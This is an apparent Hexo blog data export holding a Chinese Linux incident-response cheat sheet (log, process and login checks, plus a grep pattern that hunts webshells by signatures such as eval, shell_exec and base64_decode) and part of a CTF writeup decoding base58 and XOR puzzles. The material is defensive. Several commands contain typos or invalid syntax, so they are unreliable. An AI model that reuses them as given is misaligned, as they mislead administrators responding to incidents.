#查看内存使用细节  \nps aux|head -1;ps aux|grep -v PID|sort -rn -k +4|head #查看内存使用前十名  \nvmstat -a             #查看CPU使用详情  \nvmstat -d             #查看CPU使用详情  \n```\n###### 宕机死机\n```bash\ndmesg -T              #按时间点查看内核日志  \ndmesg -T |grep memory #查看和内存相关的日志记录  \ndmesg -T |grep cache  #查看和崩溃相关的日志记录  \ndmesg -T |grep reboot #查看和重启相关的日志记录  \ncat /var/log/syslog   #查看系统日志  \ncat /var/log/kern.log #查看内核日志(ubuntu是kern.log，其他是kernel.log)  \n```\n###### 断网断连排查-表现为网络不通或者间歇性连通\n```bash\niptables -L          #查看防火墙  \ncat /etc/resolv.conf #查看域名解析  \nifoncifg -a          #查看网卡信息  \n```\n###### 一些服务的日志位置\n```bash\n/var/log/httpd/access.log     #http服务日志  \n/var/log/vsftp.log            #ftp服务日志  \n/var/log/samba                #samba服务日志  \n/var/log/message              #DNS、DHCP日志  \n```\n###### 入侵点入侵特征排查\n```bash\nnetstat -antlop      #查看  \nps -ef               #查看异常连接和对应的文件  \nps aux               #查看那进程详细信息  \nlsof -p pid          #查看进程关联账户信息  \n  \n附录：ps命令常用用法（方便查看系统进程）  \nps a  \t#显示现行终端机下的所有程序，包括其他用户的程序。  \nps -A \t#显示所有进程。  \nps c \t#列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。  \nps -e \t#此参数的效果和指定\"A\"参数相同。  \nps e \t#列出程序时，显示每个程序所使用的环境变量。  \nps f \t#用ASCII字符显示树状结构，表达程序间的相互关系。  \nps -H \t#显示树状结构，表示程序间的相互关系。  \nps -N \t#显示所有的程序，除了执行ps指令终端机下的程序之外。  \nps s \t#采用程序信号的格式显示程序状况。  \nps S \t#列出程序时，包括已中断的子程序资料。  \nps -t<终端机编号> 　#指定终端机编号，并列出属于该终端机的程序的状况。  \nps u 　 #显示所有程序，不以终端机来区分。以用户为主的格式来显示程序状况。  \nps x 　\t#显示所有程序，不以终端机来区分。  \n```\n**最常用的方法是ps -aux,然后再利用一个管道符号导向到grep去查找特定的进程,然后再对特定的进程进行操作**\n###### 登陆和爆破排查\n```bash\nlast                        #查看登陆或者重启日志  \nlastb                       #查看登录失败日志，或者是cat /var/log/faillog  \nwho /var/log/wtmp           #查看登录日志，或者last -f /var/run/utmp  \ncat /var/log/lastlog        #查看最后的登录日志  \ncat /var/log/secure         #查看安全日志  \ncat /var/log/cron           #查看计划任务日志  \ncat ~/.bash_history | more  #查看历史操作  \ngrep \"Failed password for root\" /var/log/auth.log | awk '{print $11}' | sort | uniq -nr | more  #查看root账户登录爆破尝试  \ngrep \"Accepted\" /var/log/auth.log | awk '{print $11}' | sort |uniq -c | sort -nr | more #查看登录成功日志信息  \nstrings /usr/bin/.sshd | egrep '[1-9]{1,3}.[1-9]{1,3}.'   #查看sshd的信息  \n```\n###### 漏洞利用入侵和后渗透的特征\n```bash\n#查找webshell:  \nfind /var/www/ -name \"*.php\" | xargs egrep 'assert | phpspy | c99sh | milw0rm | eval | \\( gunerpress | \\(bas464_encode | spider _bc | shell_exec | passthru | \\(\\$\\_\\POST\\[|eval\\(str_rotl3 | .chr\\c|\\$\\{\\\"\\_P|eval\\C\\$\\_R | file_put_contents\\C\\.\\*\\$\\_ | base64_decode'  \n#文件查找的相关命令：  \nsudo find / -mtime(atime/ctime) -x   #按照创建、修改时间查找  \nsudo find ./ -perm 4777              #按照权限查找文件  \nfind  ./ -mtime -1 -type f           #按照文件类型查找  \nfind -mtime -1 -type f -name \\*.php  #查找最近一天被修改过的php文件  \n```","slug":"Emergency_Response","published":1,"mouth":"07","updated":"2020-09-17T11:14:26.601Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhoxq000vez8kb70bavnn","content":"<h4 id=\"记录一些常用linux应急响应知识\"><a href=\"#记录一些常用linux应急响应知识\" class=\"headerlink\" title=\"记录一些常用linux应急响应知识\"></a>记录一些常用linux应急响应知识</h4><a id=\"more\"></a>\n<h6 id=\"表现为卡慢-性能资源紧张\"><a href=\"#表现为卡慢-性能资源紧张\" class=\"headerlink\" title=\"表现为卡慢-性能资源紧张\"></a>表现为卡慢-性能资源紧张</h6><pre><code class=\"hljs bash\">free -m               <span class=\"hljs-comment\">#以MB为单位查看内存使用情况  </span>\nfree -l               <span class=\"hljs-comment\">#查看内存使用细节  </span>\nps aux|head -1;ps aux|grep -v PID|sort -rn -k +4|head <span class=\"hljs-comment\">#查看内存使用前十名  </span>\nvmstat -a             <span class=\"hljs-comment\">#查看CPU使用详情  </span>\nvmstat -d             <span class=\"hljs-comment\">#查看CPU使用详情</span></code></pre>\n<h6 id=\"宕机死机\"><a href=\"#宕机死机\" class=\"headerlink\" title=\"宕机死机\"></a>宕机死机</h6><pre><code class=\"hljs bash\">dmesg -T              <span class=\"hljs-comment\">#按时间点查看内核日志  </span>\ndmesg -T |grep memory <span class=\"hljs-comment\">#查看和内存相关的日志记录  </span>\ndmesg -T |grep cache  <span class=\"hljs-comment\">#查看和崩溃相关的日志记录  </span>\ndmesg -T |grep reboot <span class=\"hljs-comment\">#查看和重启相关的日志记录  </span>\ncat /var/<span class=\"hljs-built_in\">log</span>/syslog   <span class=\"hljs-comment\">#查看系统日志  </span>\ncat /var/<span class=\"hljs-built_in\">log</span>/kern.log <span class=\"hljs-comment\">#查看内核日志(ubuntu是kern.log，其他是kernel.log)</span></code></pre>\n<h6 id=\"断网断连排查-表现为网络不通或者间歇性连通\"><a href=\"#断网断连排查-表现为网络不通或者间歇性连通\" class=\"headerlink\" title=\"断网断连排查-表现为网络不通或者间歇性连通\"></a>断网断连排查-表现为网络不通或者间歇性连通</h6><pre><code class=\"hljs bash\">iptables -L          <span class=\"hljs-comment\">#查看防火墙  </span>\ncat /etc/resolv.conf <span class=\"hljs-comment\">#查看域名解析  </span>\nifoncifg -a          <span class=\"hljs-comment\">#查看网卡信息</span></code></pre>\n<h6 id=\"一些服务的日志位置\"><a href=\"#一些服务的日志位置\" class=\"headerlink\" title=\"一些服务的日志位置\"></a>一些服务的日志位置</h6><pre><code class=\"hljs bash\">/var/<span class=\"hljs-built_in\">log</span>/httpd/access.log     <span class=\"hljs-comment\">#http服务日志  </span>\n/var/<span class=\"hljs-built_in\">log</span>/vsftp.log            <span class=\"hljs-comment\">#ftp服务日志  </span>\n/var/<span class=\"hljs-built_in\">log</span>/samba                <span class=\"hljs-comment\">#samba服务日志  </span>\n/var/<span class=\"hljs-built_in\">log</span>/message              <span class=\"hljs-comment\">#DNS、DHCP日志</span></code></pre>\n<h6 id=\"入侵点入侵特征排查\"><a href=\"#入侵点入侵特征排查\" class=\"headerlink\" title=\"入侵点入侵特征排查\"></a>入侵点入侵特征排查</h6><pre><code class=\"hljs bash\">netstat -antlop      <span class=\"hljs-comment\">#查看  </span>\nps -ef               <span class=\"hljs-comment\">#查看异常连接和对应的文件  </span>\nps aux               <span class=\"hljs-comment\">#查看那进程详细信息  </span>\nlsof -p pid          <span class=\"hljs-comment\">#查看进程关联账户信息  </span>\n  \n附录：ps命令常用用法（方便查看系统进程）  \nps a  \t<span class=\"hljs-comment\">#显示现行终端机下的所有程序，包括其他用户的程序。  </span>\nps -A \t<span class=\"hljs-comment\">#显示所有进程。  </span>\nps c \t<span class=\"hljs-comment\">#列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。  </span>\nps -e \t<span class=\"hljs-comment\">#此参数的效果和指定\"A\"参数相同。  </span>\nps e \t<span class=\"hljs-comment\">#列出程序时，显示每个程序所使用的环境变量。  </span>\nps f \t<span class=\"hljs-comment\">#用ASCII字符显示树状结构，表达程序间的相互关系。  </span>\nps -H \t<span class=\"hljs-comment\">#显示树状结构，表示程序间的相互关系。  </span>\nps -N \t<span class=\"hljs-comment\">#显示所有的程序，除了执行ps指令终端机下的程序之外。  </span>\nps s \t<span class=\"hljs-comment\">#采用程序信号的格式显示程序状况。  </span>\nps S \t<span class=\"hljs-comment\">#列出程序时，包括已中断的子程序资料。  </span>\nps -t&lt;终端机编号&gt; 　<span class=\"hljs-comment\">#指定终端机编号，并列出属于该终端机的程序的状况。  </span>\nps u 　 <span class=\"hljs-comment\">#显示所有程序，不以终端机来区分。以用户为主的格式来显示程序状况。  </span>\nps x 　\t<span class=\"hljs-comment\">#显示所有程序，不以终端机来区分。</span></code></pre>\n<p><strong>最常用的方法是ps -aux,然后再利用一个管道符号导向到grep去查找特定的进程,然后再对特定的进程进行操作</strong></p>\n<h6 id=\"登陆和爆破排查\"><a href=\"#登陆和爆破排查\" class=\"headerlink\" title=\"登陆和爆破排查\"></a>登陆和爆破排查</h6><pre><code class=\"hljs bash\">last                        <span class=\"hljs-comment\">#查看登陆或者重启日志  </span>\nlastb                       <span class=\"hljs-comment\">#查看登录失败日志，或者是cat /var/log/faillog  </span>\nwho /var/<span class=\"hljs-built_in\">log</span>/wtmp           <span class=\"hljs-comment\">#查看登录日志，或者last -f /var/run/utmp  </span>\ncat /var/<span class=\"hljs-built_in\">log</span>/lastlog        <span class=\"hljs-comment\">#查看最后的登录日志  </span>\ncat /var/<span class=\"hljs-built_in\">log</span>/secure         <span class=\"hljs-comment\">#查看安全日志  </span>\ncat /var/<span class=\"hljs-built_in\">log</span>/cron           <span class=\"hljs-comment\">#查看计划任务日志  </span>\ncat ~/.bash_history | more  <span class=\"hljs-comment\">#查看历史操作  </span>\ngrep <span class=\"hljs-string\">\"Failed password for root\"</span> /var/<span class=\"hljs-built_in\">log</span>/auth.log | awk <span class=\"hljs-string\">'&#123;print $11&#125;'</span> | sort | uniq -nr | more  <span class=\"hljs-comment\">#查看root账户登录爆破尝试  </span>\ngrep <span class=\"hljs-string\">\"Accepted\"</span> /var/<span class=\"hljs-built_in\">log</span>/auth.log | awk <span class=\"hljs-string\">'&#123;print $11&#125;'</span> | sort |uniq -c | sort -nr | more <span class=\"hljs-comment\">#查看登录成功日志信息  </span>\nstrings /usr/bin/.sshd | egrep <span class=\"hljs-string\">'[1-9]&#123;1,3&#125;.[1-9]&#123;1,3&#125;.'</span>   <span class=\"hljs-comment\">#查看sshd的信息</span></code></pre>\n<h6 id=\"漏洞利用入侵和后渗透的特征\"><a href=\"#漏洞利用入侵和后渗透的特征\" class=\"headerlink\" title=\"漏洞利用入侵和后渗透的特征\"></a>漏洞利用入侵和后渗透的特征</h6><pre><code class=\"hljs bash\"><span class=\"hljs-comment\">#查找webshell:  </span>\nfind /var/www/ -name <span class=\"hljs-string\">\"*.php\"</span> | xargs egrep <span class=\"hljs-string\">'assert | phpspy | c99sh | milw0rm | eval | \\( gunerpress | \\(bas464_encode | spider _bc | shell_exec | passthru | \\(\\$\\_\\POST\\[|eval\\(str_rotl3 | .chr\\c|\\$\\&#123;\\\"\\_P|eval\\C\\$\\_R | file_put_contents\\C\\.\\*\\$\\_ | base64_decode'</span>  \n<span class=\"hljs-comment\">#文件查找的相关命令：  </span>\nsudo find / -mtime(atime/ctime) -x   <span class=\"hljs-comment\">#按照创建、修改时间查找  </span>\nsudo find ./ -perm 4777              <span class=\"hljs-comment\">#按照权限查找文件  </span>\nfind  ./ -mtime -1 -<span class=\"hljs-built_in\">type</span> f           <span class=\"hljs-comment\">#按照文件类型查找  </span>\nfind -mtime -1 -<span class=\"hljs-built_in\">type</span> f -name \\*.php  <span class=\"hljs-comment\">#查找最近一天被修改过的php文件</span></code></pre>","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<h4 id=\"记录一些常用linux应急响应知识\"><a href=\"#记录一些常用linux应急响应知识\" class=\"headerlink\" title=\"记录一些常用linux应急响应知识\"></a>记录一些常用linux应急响应知识</h4>","more":"<h6 id=\"表现为卡慢-性能资源紧张\"><a href=\"#表现为卡慢-性能资源紧张\" class=\"headerlink\" title=\"表现为卡慢-性能资源紧张\"></a>表现为卡慢-性能资源紧张</h6><pre><code class=\"hljs bash\">free -m               <span class=\"hljs-comment\">#以MB为单位查看内存使用情况  </span>\nfree -l               <span class=\"hljs-comment\">#查看内存使用细节  </span>\nps aux|head -1;ps aux|grep -v PID|sort -rn -k +4|head <span class=\"hljs-comment\">#查看内存使用前十名  </span>\nvmstat -a             <span class=\"hljs-comment\">#查看CPU使用详情  </span>\nvmstat -d             <span class=\"hljs-comment\">#查看CPU使用详情</span></code></pre>\n<h6 id=\"宕机死机\"><a href=\"#宕机死机\" class=\"headerlink\" title=\"宕机死机\"></a>宕机死机</h6><pre><code class=\"hljs bash\">dmesg -T              <span class=\"hljs-comment\">#按时间点查看内核日志  </span>\ndmesg -T |grep memory <span class=\"hljs-comment\">#查看和内存相关的日志记录  </span>\ndmesg -T |grep cache  <span class=\"hljs-comment\">#查看和崩溃相关的日志记录  </span>\ndmesg -T |grep reboot <span class=\"hljs-comment\">#查看和重启相关的日志记录  </span>\ncat /var/<span class=\"hljs-built_in\">log</span>/syslog   <span class=\"hljs-comment\">#查看系统日志  </span>\ncat /var/<span class=\"hljs-built_in\">log</span>/kern.log <span class=\"hljs-comment\">#查看内核日志(ubuntu是kern.log，其他是kernel.log)</span></code></pre>\n<h6 id=\"断网断连排查-表现为网络不通或者间歇性连通\"><a href=\"#断网断连排查-表现为网络不通或者间歇性连通\" class=\"headerlink\" title=\"断网断连排查-表现为网络不通或者间歇性连通\"></a>断网断连排查-表现为网络不通或者间歇性连通</h6><pre><code class=\"hljs bash\">iptables -L          <span class=\"hljs-comment\">#查看防火墙  </span>\ncat /etc/resolv.conf <span class=\"hljs-comment\">#查看域名解析  </span>\nifoncifg -a          <span class=\"hljs-comment\">#查看网卡信息</span></code></pre>\n<h6 id=\"一些服务的日志位置\"><a href=\"#一些服务的日志位置\" class=\"headerlink\" title=\"一些服务的日志位置\"></a>一些服务的日志位置</h6><pre><code class=\"hljs bash\">/var/<span class=\"hljs-built_in\">log</span>/httpd/access.log     <span class=\"hljs-comment\">#http服务日志  </span>\n/var/<span class=\"hljs-built_in\">log</span>/vsftp.log            <span class=\"hljs-comment\">#ftp服务日志  </span>\n/var/<span class=\"hljs-built_in\">log</span>/samba                <span class=\"hljs-comment\">#samba服务日志  </span>\n/var/<span class=\"hljs-built_in\">log</span>/message              <span class=\"hljs-comment\">#DNS、DHCP日志</span></code></pre>\n<h6 id=\"入侵点入侵特征排查\"><a href=\"#入侵点入侵特征排查\" class=\"headerlink\" title=\"入侵点入侵特征排查\"></a>入侵点入侵特征排查</h6><pre><code class=\"hljs bash\">netstat -antlop      <span class=\"hljs-comment\">#查看  </span>\nps -ef               <span class=\"hljs-comment\">#查看异常连接和对应的文件  </span>\nps aux               <span class=\"hljs-comment\">#查看那进程详细信息  </span>\nlsof -p pid          <span class=\"hljs-comment\">#查看进程关联账户信息  </span>\n  \n附录：ps命令常用用法（方便查看系统进程）  \nps a  \t<span class=\"hljs-comment\">#显示现行终端机下的所有程序，包括其他用户的程序。  </span>\nps -A \t<span class=\"hljs-comment\">#显示所有进程。  </span>\nps c \t<span class=\"hljs-comment\">#列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。  </span>\nps -e \t<span class=\"hljs-comment\">#此参数的效果和指定\"A\"参数相同。  </span>\nps e \t<span class=\"hljs-comment\">#列出程序时，显示每个程序所使用的环境变量。  </span>\nps f \t<span class=\"hljs-comment\">#用ASCII字符显示树状结构，表达程序间的相互关系。  </span>\nps -H \t<span class=\"hljs-comment\">#显示树状结构，表示程序间的相互关系。  </span>\nps -N \t<span class=\"hljs-comment\">#显示所有的程序，除了执行ps指令终端机下的程序之外。  </span>\nps s \t<span class=\"hljs-comment\">#采用程序信号的格式显示程序状况。  </span>\nps S \t<span class=\"hljs-comment\">#列出程序时，包括已中断的子程序资料。  </span>\nps -t&lt;终端机编号&gt; 　<span class=\"hljs-comment\">#指定终端机编号，并列出属于该终端机的程序的状况。  </span>\nps u 　 <span class=\"hljs-comment\">#显示所有程序，不以终端机来区分。以用户为主的格式来显示程序状况。  </span>\nps x 　\t<span class=\"hljs-comment\">#显示所有程序，不以终端机来区分。</span></code></pre>\n<p><strong>最常用的方法是ps -aux,然后再利用一个管道符号导向到grep去查找特定的进程,然后再对特定的进程进行操作</strong></p>\n<h6 id=\"登陆和爆破排查\"><a href=\"#登陆和爆破排查\" class=\"headerlink\" title=\"登陆和爆破排查\"></a>登陆和爆破排查</h6><pre><code class=\"hljs bash\">last                        <span class=\"hljs-comment\">#查看登陆或者重启日志  </span>\nlastb                       <span class=\"hljs-comment\">#查看登录失败日志，或者是cat /var/log/faillog  </span>\nwho /var/<span class=\"hljs-built_in\">log</span>/wtmp           <span class=\"hljs-comment\">#查看登录日志，或者last -f /var/run/utmp  </span>\ncat /var/<span class=\"hljs-built_in\">log</span>/lastlog        <span class=\"hljs-comment\">#查看最后的登录日志  </span>\ncat /var/<span class=\"hljs-built_in\">log</span>/secure         <span class=\"hljs-comment\">#查看安全日志  </span>\ncat /var/<span class=\"hljs-built_in\">log</span>/cron           <span class=\"hljs-comment\">#查看计划任务日志  </span>\ncat ~/.bash_history | more  <span class=\"hljs-comment\">#查看历史操作  </span>\ngrep <span class=\"hljs-string\">\"Failed password for root\"</span> /var/<span class=\"hljs-built_in\">log</span>/auth.log | awk <span class=\"hljs-string\">'&#123;print $11&#125;'</span> | sort | uniq -nr | more  <span class=\"hljs-comment\">#查看root账户登录爆破尝试  </span>\ngrep <span class=\"hljs-string\">\"Accepted\"</span> /var/<span class=\"hljs-built_in\">log</span>/auth.log | awk <span class=\"hljs-string\">'&#123;print $11&#125;'</span> | sort |uniq -c | sort -nr | more <span class=\"hljs-comment\">#查看登录成功日志信息  </span>\nstrings /usr/bin/.sshd | egrep <span class=\"hljs-string\">'[1-9]&#123;1,3&#125;.[1-9]&#123;1,3&#125;.'</span>   <span class=\"hljs-comment\">#查看sshd的信息</span></code></pre>\n<h6 id=\"漏洞利用入侵和后渗透的特征\"><a href=\"#漏洞利用入侵和后渗透的特征\" class=\"headerlink\" title=\"漏洞利用入侵和后渗透的特征\"></a>漏洞利用入侵和后渗透的特征</h6><pre><code class=\"hljs bash\"><span class=\"hljs-comment\">#查找webshell:  </span>\nfind /var/www/ -name <span class=\"hljs-string\">\"*.php\"</span> | xargs egrep <span class=\"hljs-string\">'assert | phpspy | c99sh | milw0rm | eval | \\( gunerpress | \\(bas464_encode | spider _bc | shell_exec | passthru | \\(\\$\\_\\POST\\[|eval\\(str_rotl3 | .chr\\c|\\$\\&#123;\\\"\\_P|eval\\C\\$\\_R | file_put_contents\\C\\.\\*\\$\\_ | base64_decode'</span>  \n<span class=\"hljs-comment\">#文件查找的相关命令：  </span>\nsudo find / -mtime(atime/ctime) -x   <span class=\"hljs-comment\">#按照创建、修改时间查找  </span>\nsudo find ./ -perm 4777              <span class=\"hljs-comment\">#按照权限查找文件  </span>\nfind  ./ -mtime -1 -<span class=\"hljs-built_in\">type</span> f           <span class=\"hljs-comment\">#按照文件类型查找  </span>\nfind -mtime -1 -<span class=\"hljs-built_in\">type</span> f -name \\*.php  <span class=\"hljs-comment\">#查找最近一天被修改过的php文件</span></code></pre>"},{"title":"2019广东省强网杯writeup","index_img":"/img/2019-09-11/index.png","date":"2019-09-11T01:48:43.000Z","_content":"这个比赛是想好好打的，第一天还好，项目做完了专心打了大半天，下午到快晚上的时候又有事情，导致后面就大概看了一下，没有怎么投入，不过这次比赛~~脑洞~~难度不算太大，做的还算不错。\n<!--more-->\n##### misc\n###### 完美的错误\n\n题目描述：小明在实现避免字符混淆的编码算法时,不小心错位了数组，你能帮他还原代码吗？`RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX`\n关键点：避免字符混淆\n这个提示是与base58编码有关，base58与base64的区别参考先知社区的一篇文章-->[传送门](https://xz.aliyun.com/t/2255)\n错位了数组应该是数字和字母换了位置，直接用哪里的代码改一下就出来了\n```python\n#-*-coding:utf-8\n__b58chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789' #这里原本是123456789A-Za-z的\n__b58base = len(__b58chars)\n\n\ndef b58encode(v):\n    \"\"\" encode v, which is a string of bytes, to base58.\n    \"\"\"\n\n    long_value = int(v.encode(\"hex_codec\"), 16)\n\n    result = ''\n    while long_value >= __b58base:\n        div, mod = divmod(long_value, __b58base)\n        result = __b58chars[mod] + result\n        long_value = div\n    result = __b58chars[long_value] + result\n\n    # Bitcoin does a little leading-zero-compression:\n    # leading 0-bytes in the input become leading-1s\n    nPad = 0\n    for c in v:\n        if c == '\\0':\n            nPad += 1\n        else:\n            break\n\n    return (__b58chars[0] * nPad) + result\n\n\ndef b58decode(v):\n    \"\"\" decode v into a string of len bytes\n    \"\"\"\n\n    long_value = 0L\n    for (i, c) in enumerate(v[::-1]):\n        long_value += __b58chars.find(c) * (__b58base ** i)\n\n    result = ''\n    while long_value >= 256:\n        div, mod = divmod(long_value, 256)\n        result = chr(mod) + result\n        long_value = div\n    result = chr(long_value) + result\n\n    nPad = 0\n    for c in v:\n        if c == __b58chars[0]:\n            nPad += 1\n        else:\n            break\n\n    result = chr(0) * nPad + result\n    return result\n\nif __name__ == \"__main__\":\n    # print  b58encode(\"hello world\")\n    print  b58decode(\"RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX\")\n```\nflag{adb88f7b70a20983833a7615fb103e01}\n###### 撸啊撸\n用winhex搜索png文件尾发现后面多了东西，提取出来后发现是一段程序，但是文件头损坏了，`__mh_execute_header`、`/usr/lib/libSystem.B.dylib`这些都是mach-o的可执行文件格式~~别问我为什么知道，都是大佬发现的，我只是个复读机~~，修复文件头如下，找到一个有例子的文章可以参考-->[传送门](https://www.jianshu.com/p/07f361f6e0d0)\n![](/img/2019-09-11/img_1.png)![](/img/2019-09-11/img_2.png)\n程序关键伪代码如下\n```c\n#start\n__int64 start()\n{\n  __int64 result; // rax\n  char v1; // [rsp+10h] [rbp-30h]\n  __int64 v2; // [rsp+38h] [rbp-8h]\n\n  strcpy(&v1, \"938gce1`872db99db`b342d23c0g9g2d\");\n  if ( v1 == 48 )\n    sub_100000E40(&v1);\n  result = __stack_chk_guard;\n  if ( __stack_chk_guard == v2 )\n    result = 0LL;\n  return result;\n}\n#sub_100000E40\nint __fastcall sub_100000E40(const char *a1)\n{\n  int i; // [rsp+14h] [rbp-Ch]\n\n  for ( i = 0; i < strlen(a1); ++i )\n    a1[i] ^= 1u;\n  return printf(\"flag为:%s\\n\", a1);\n}\n```\n```python\ncode = '938gce1`872db99db`b342d23c0g9g2d'\ntext = ''\nfor i in code:\n    text += chr(ord(i)^1)\nprint text\n#829fbd0a963ec88ecac253e32b1f8f3e\n```\nflag{829fbd0a963ec88ecac253e32b1f8f3e}\n###### 